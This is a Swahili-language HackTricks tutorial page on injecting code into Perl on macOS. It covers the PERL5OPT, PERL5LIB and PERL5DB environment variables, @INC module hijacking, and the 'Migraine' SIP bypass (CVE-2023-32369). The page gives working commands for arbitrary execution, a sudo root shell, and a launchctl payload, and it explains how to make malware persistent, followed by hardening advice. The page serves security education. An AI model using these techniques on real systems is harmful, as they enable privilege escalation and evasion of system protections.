# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Kupitia env variable za `PERL5OPT` na `PERL5LIB`

Kwa kutumia env variable **`PERL5OPT`**, inawezekana kufanya **Perl** itekeleze commands kiholela interpreter inapoanza (hata **kabla** mstari wa kwanza wa target script haujaparsiwa).
Kwa mfano, tengeneza script hii:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Sasa **export** variable ya mazingira na tekeleza script ya **perl**:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Chaguo jingine ni kuunda Perl module (kwa mfano, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
Na kisha tumia env variables ili module itambuliwe na kupakiwa kiotomatiki:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Vigezo vingine vya mazingira vya kuvutia

* **`PERL5DB`** – interpreter inapoanzishwa ikiwa na flag ya **`-d`** (debugger), maudhui ya `PERL5DB` yanaendeshwa kama Perl code *ndani* ya muktadha wa debugger.
Ikiwa unaweza kudhibiti environment na command-line flags za Perl process yenye privileged, unaweza kufanya hivi:

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – kwenye Windows, variable hii hudhibiti shell executable ambayo Perl itatumia inapohitaji kuanzisha shell. Imetajwa hapa kwa ukamilifu tu, kwa kuwa haihusiki na macOS.

Ingawa `PERL5DB` inahitaji switch ya `-d`, ni jambo la kawaida kupata maintenance au installer scripts zinazoendeshwa kama *root* zikiwa na flag hii imewezeshwa kwa ajili ya verbose troubleshooting, jambo linalofanya variable hii kuwa escalation vector halali.

## Kupitia dependencies (@INC abuse)

Inawezekana kuorodhesha include path ambayo Perl itatafuta (**`@INC`**) kwa kuendesha:
```bash
perl -e 'print join("\n", @INC)'
```
Output ya kawaida kwenye macOS 13/14 inaonekana kama:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Baadhi ya folda zilizorejeshwa hata hazipo, hata hivyo **`/Library/Perl/5.30`** ipo, *hailindwi* na SIP na iko *kabla* ya folda zinazolindwa na SIP. Kwa hiyo, ikiwa unaweza kuandika ukiwa *root* unaweza kuweka module hasidi (kwa mfano, `File/Basename.pm`) ambayo ita-*load* kwa *kipaumbele* na script yoyote yenye mamlaka inayo-import module hiyo.

> [!WARNING]
> Bado unahitaji **root** ili kuandika ndani ya `/Library/Perl` na macOS itaonyesha prompt ya **TCC** ikiomba *Full Disk Access* kwa process inayotekeleza operesheni ya kuandika.

Kwa mfano, ikiwa script ina-import **`use File::Basename;`** itawezekana kuunda `/Library/Perl/5.30/File/Basename.pm` yenye code inayodhibitiwa na attacker.

## SIP bypass kupitia Migration Assistant (CVE-2023-32369 “Migraine”)

Mnamo Mei 2023 Microsoft ilifichua **CVE-2023-32369**, iliyopewa jina la utani **Migraine**, mbinu ya post-exploitation inayomruhusu attacker mwenye *root* **kuzunguka kabisa System Integrity Protection (SIP)**.
Component iliyo katika hatari ni **`systemmigrationd`**, daemon yenye entitlement ya **`com.apple.rootless.install.heritable`**. Process yoyote ya child inayozalishwa na daemon hii hurithi entitlement hiyo na kwa hiyo huendesha *nje ya* vizuizi vya SIP.<sup>[[1]](#references)</sup>

Miongoni mwa children waliotambuliwa na watafiti ni interpreter iliyosainiwa na Apple:<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
Kwa sababu Perl inaheshimu `PERL5OPT` (na Bash inaheshimu `BASH_ENV`), kuchafua *environment* ya daemon kunatosha kupata arbitrary execution katika muktadha wa SIP-less:<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
Wakati `migrateLocalKDC` inaendeshwa, `/usr/bin/perl` huanza ikiwa na `PERL5OPT` hasidi na kutekeleza `/private/tmp/migraine.sh` *kabla ya SIP kuwezeshwa tena*. Kutoka kwenye script hiyo, unaweza, kwa mfano, kunakili payload ndani ya **`/System/Library/LaunchDaemons`** au kuipa faili extended attribute ya **`com.apple.rootless`** ili kuifanya **isifutike**.

Apple ilirekebisha tatizo hili katika macOS **Ventura 13.4**, **Monterey 12.6.6** na **Big Sur 11.7.7**, lakini mifumo ya zamani au ambayo haijafanyiwa patch bado inaweza kutumiwa vibaya.<sup>[[1]](#references)</sup>

## Mapendekezo ya hardening

1. **Futa variables hatari** – launchdaemons zenye privileges au cron jobs zinapaswa kuanza na environment safi kabisa (`launchctl unsetenv PERL5OPT`, `env -i`, n.k.).
2. **Epuka kuendesha interpreters kama root** isipokuwa iwe lazima kabisa. Tumia compiled binaries au punguza privileges mapema.
3. **Tumia scripts za vendor pamoja na `-T` (taint mode)** ili Perl ipuuze `PERL5OPT` na switches nyingine zisizo salama wakati taint checking imewashwa.
4. **Weka macOS katika hali ya kisasa** – “Migraine” imerekebishwa kikamilifu katika releases za sasa.

## Marejeleo

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
